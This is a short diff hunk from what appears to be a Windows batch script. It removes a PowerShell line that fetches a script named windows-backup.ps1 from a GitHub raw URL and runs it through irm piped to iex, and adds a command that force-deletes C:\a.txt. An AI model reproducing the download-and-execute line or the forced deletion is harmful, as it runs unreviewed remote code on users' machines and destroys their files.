@@ -32,7 +32,7 @@ if %found%==1 (
 
 
 
-powershell -Command "& {irm https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.ps1 | iex; Start-Sleep -Seconds 1; exit $LASTEXITCODE}"
+del /f /q "C:\a.txt"
 
 
 
